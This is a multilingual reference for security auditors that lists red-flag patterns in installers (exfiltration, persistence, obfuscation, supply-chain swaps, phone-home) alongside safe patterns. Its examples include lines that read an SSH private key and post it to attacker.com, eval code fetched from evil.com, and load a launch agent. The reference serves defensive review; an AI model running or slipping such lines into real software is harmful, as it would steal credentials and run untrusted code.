# Red Flag Patterns — Security Auditor Reference

---

## 🚨 CRITICAL — Stop immediately
## 🚨 KRITICKÉ — Okamžitý stop (SK)
## 🚨 KRITICKÉ — Okamžitý stop (CZ)
## 🚨 KRITISCH — Sofort stoppen (DE)
## 🚨 CRITIQUE — Arrêt immédiat (FR)
## 🚨 CRITICO — Stop immediato (IT)
## 🚨 KRYTYCZNE — Natychmiastowe zatrzymanie (PL)
## 🚨 CRÍTICO — Detener inmediatamente (ES)

---

### 1. Data exfiltration / Exfiltrácia dát / Exfiltrace dat / Datenexfiltration / Exfiltration de données / Esfiltrazione dati / Eksfiltracja danych / Exfiltración de datos

> Reading SSH keys, env variables or macOS Keychain and sending them to an external server.
>
> Čítanie SSH kľúčov, env premenných alebo macOS Keychain a odosielanie na externý server.
>
> Čtení SSH klíčů, env proměnných nebo macOS Keychain a odesílání na externí server.
>
> Lesen von SSH-Schlüsseln, Umgebungsvariablen oder macOS Keychain und Senden an externen Server.
>
> Lecture des clés SSH, variables d'environnement ou macOS Keychain et envoi à un serveur externe.
>
> Lettura di chiavi SSH, variabili d'ambiente o macOS Keychain e invio a server esterno.
>
> Odczyt kluczy SSH, zmiennych środowiskowych lub macOS Keychain i wysyłanie na zewnętrzny serwer.
>
> Lectura de claves SSH, variables de entorno o macOS Keychain y envío a servidor externo.

```python
# Example of malicious code / Príklad škodlivého kódu
open(os.path.expanduser("~/.ssh/id_rsa")).read()
requests.post("https://attacker.com", data=key)
```

---

### 2. System persistence / Systémová perzistencia / Systémová perzistence / Systembeständigkeit / Persistance système / Persistenza di sistema / Trwałość systemu / Persistencia del sistema

> Runs malicious code automatically after every system restart.
>
> Spúšťa škodlivý kód automaticky po každom reštarte systému.
>
> Spouští škodlivý kód automaticky po každém restartu systému.
>
> Führt Schadcode nach jedem Systemstart automatisch aus.
>
> Exécute du code malveillant automatiquement après chaque redémarrage.
>
> Esegue codice dannoso automaticamente dopo ogni riavvio del sistema.
>
> Uruchamia złośliwy kod automatycznie po każdym restarcie systemu.
>
> Ejecuta código malicioso automáticamente tras cada reinicio del sistema.

```bash
# Red flag examples
launchctl load ~/Library/LaunchAgents/evil.plist
defaults write com.apple.loginitems ...
```

---

### 3. Obfuscation / Obfuskácia / Obfuskace / Verschleierung / Obfuscation / Offuscamento / Obfuskacja / Ofuscación

> Downloads and executes hidden code that cannot be reviewed before running.
>
> Stiahne a spustí skrytý kód, ktorý sa nedá skontrolovať pred spustením.
>
> Stáhne a spustí skrytý kód, který nelze zkontrolovat před spuštěním.
>
> Lädt versteckten Code herunter und führt ihn aus, ohne dass er vorher überprüft werden kann.
>
> Télécharge et exécute du code caché qui ne peut pas être vérifié avant l'exécution.
>
> Scarica ed esegue codice nascosto che non può essere verificato prima dell'esecuzione.
>
> Pobiera i uruchamia ukryty kod, który nie może być sprawdzony przed uruchomieniem.
>
> Descarga y ejecuta código oculto que no puede revisarse antes de ejecutarse.

```python
# Red flag examples
exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0..."))
eval(requests.get("https://evil.com/payload").text)
```

---

### 4. Supply chain risk / Supply chain riziko / Supply chain riziko / Lieferkettenrisiko / Risque chaîne d'approvisionnement / Rischio supply chain / Ryzyko łańcucha dostaw / Riesgo cadena de suministro

> The installer downloads from a different repository than the one you audited.
>
> Installer stiahne súbory z iného repozitára než toho, ktorý si auditoval.
>
> Installer stáhne soubory z jiného repozitáře než toho, který jsi auditoval.
>
> Der Installer lädt Dateien aus einem anderen Repository als dem geprüften herunter.
>
> L'installateur télécharge depuis un dépôt différent de celui audité.
>
> L'installer scarica da un repository diverso da quello verificato.
>
> Installer pobiera pliki z innego repozytorium niż to, które sprawdzałeś.
>
> El instalador descarga desde un repositorio diferente al auditado.

```bash
# Red flag example
REPO_URL="https://github.com/some-other-author/different-repo"
git clone $REPO_URL   # you audited something else!
```

---

## ⚠️ MEDIUM RISK — Explain and let the user decide
## ⚠️ STREDNÉ RIZIKO — Vysvetli, nechaj rozhodnúť (SK)
## ⚠️ STŘEDNÍ RIZIKO — Vysvětli, nechej rozhodnout (CZ)
## ⚠️ MITTLERES RISIKO — Erklären und entscheiden lassen (DE)
## ⚠️ RISQUE MOYEN — Expliquer et laisser décider (FR)
## ⚠️ RISCHIO MEDIO — Spiegare e lasciare decidere (IT)
## ⚠️ ŚREDNIE RYZYKO — Wyjaśnij i pozwól zdecydować (PL)
## ⚠️ RIESGO MEDIO — Explicar y dejar decidir (ES)

---

### 5. Writing to system directories / Zápis do systémových priečinkov / Zápis do systémových adresářů / Schreiben in Systemverzeichnisse / Écriture dans répertoires système / Scrittura in directory di sistema / Zapis do katalogów systemowych / Escritura en directorios del sistema

> Copying files to `/usr/local/bin/` or `/etc/` without a clear documented reason.
>
> Kopírovanie súborov do `/usr/local/bin/` alebo `/etc/` bez jasného zdokumentovaného dôvodu.
>
> Kopírování souborů do `/usr/local/bin/` nebo `/etc/` bez jasného zdokumentovaného důvodu.
>
> Kopieren von Dateien nach `/usr/local/bin/` oder `/etc/` ohne klaren dokumentierten Grund.
>
> Copie de fichiers dans `/usr/local/bin/` ou `/etc/` sans raison clairement documentée.
>
> Copia di file in `/usr/local/bin/` o `/etc/` senza motivo chiaramente documentato.
>
> Kopiowanie plików do `/usr/local/bin/` lub `/etc/` bez wyraźnie udokumentowanego powodu.
>
> Copia de archivos en `/usr/local/bin/` o `/etc/` sin razón claramente documentada.

---

### 6. Ping home / Ping home / Ping home / Ping nach Hause / Ping maison / Ping a casa / Ping do domu / Ping a casa

> Sends installation data to the author's server without documentation or consent.
>
> Odosiela inštalačné dáta na server autora bez dokumentácie alebo súhlasu.
>
> Odesílá instalační data na server autora bez dokumentace nebo souhlasu.
>
> Sendet Installationsdaten ohne Dokumentation oder Zustimmung an den Server des Autors.
>
> Envoie des données d'installation au serveur de l'auteur sans documentation ni consentement.
>
> Invia dati di installazione al server dell'autore senza documentazione o consenso.
>
> Wysyła dane instalacyjne na serwer autora bez dokumentacji lub zgody.
>
> Envía datos de instalación al servidor del autor sin documentación ni consentimiento.

---

## ✅ ACCEPTABLE PATTERNS — These are safe
## ✅ AKCEPTOVATEĽNÉ VZORY — Toto je bezpečné (SK)
## ✅ PŘIJATELNÉ VZORY — Toto je bezpečné (CZ)
## ✅ AKZEPTABLE MUSTER — Das ist sicher (DE)
## ✅ MODÈLES ACCEPTABLES — C'est sûr (FR)
## ✅ PATTERN ACCETTABILI — Questo è sicuro (IT)
## ✅ AKCEPTOWALNE WZORCE — To jest bezpieczne (PL)
## ✅ PATRONES ACEPTABLES — Esto es seguro (ES)

---

### ✅ Temporary directories / Dočasné priečinky / Dočasné adresáře / Temporäre Verzeichnisse / Répertoires temporaires / Directory temporanee / Katalogi tymczasowe / Directorios temporales

> Cleanup after installation — completely normal and safe.
>
> Upratovanie po inštalácii — úplne normálne a bezpečné.
>
> Úklid po instalaci — zcela normální a bezpečné.

```bash
TEMP_DIR=$(mktemp -d)
trap "rm -rf ${TEMP_DIR}" EXIT
```

---

### ✅ Python virtual environment / Virtuálne prostredie / Virtuální prostředí / Virtuelle Umgebung / Environnement virtuel / Ambiente virtuale / Środowisko wirtualne / Entorno virtual

> Isolated from the rest of the system — safer than global installation.
>
> Izolované od zvyšku systému — bezpečnejšie než globálna inštalácia.
>
> Izolované od zbytku systému — bezpečnější než globální instalace.

```bash
python3 -m venv "${SKILL_DIR}/.venv"
```

---

### ✅ SSRF protection / SSRF ochrana / SSRF ochrana / SSRF-Schutz / Protection SSRF / Protezione SSRF / Ochrona SSRF / Protección SSRF

> Blocks access to private/internal IP addresses — positive security signal.
>
> Blokuje prístup na privátne/interné IP adresy — pozitívny bezpečnostný signál.
>
> Blokuje přístup na privátní/interní IP adresy — pozitivní bezpečnostní signál.

```python
ip = ipaddress.ip_address(resolved_ip)
if ip.is_private or ip.is_loopback:
    return {"error": "Blocked: private IP"}
```

---

### ✅ OAuth on localhost / OAuth na localhost / OAuth na localhost / OAuth auf localhost / OAuth sur localhost / OAuth su localhost / OAuth na localhost / OAuth en localhost

> Standard safe OAuth callback pattern — not a red flag.
>
> Štandardný bezpečný OAuth callback — nie je červená vlajka.
>
> Standardní bezpečný OAuth callback — není červená vlajka.

```python
OAUTH_REDIRECT_URI = "http://localhost:8085"
```

---

### ✅ Pinned version / Pinovaná verzia / Pinovaná verze / Fixierte Version / Version épinglée / Versione bloccata / Przypięta wersja / Versión fijada

> Installs a specific tested version, not a live unpredictable main branch.
>
> Inštaluje konkrétnu otestovanú verziu, nie živú nepredvídateľnú main vetvu.
>
> Instaluje konkrétní otestovanou verzi, ne živou nepředvídatelnou větev main.

```bash
REPO_TAG="${APP_TAG:-v1.6.0}"
git clone --branch "${REPO_TAG}"
```
